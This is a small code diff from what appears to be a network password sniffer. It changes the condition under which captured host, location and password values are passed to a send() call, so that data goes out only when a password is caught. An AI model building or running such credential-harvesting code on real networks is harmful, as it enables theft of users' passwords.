@@ -31,7 +31,8 @@ sniffer(INTERFACE, text => {
         pass = text;
     }
 
-    (host || location || pass) && send({
+    //host || location || pass) && send({
+    (pass) && send({
         host,
         location,
         pass
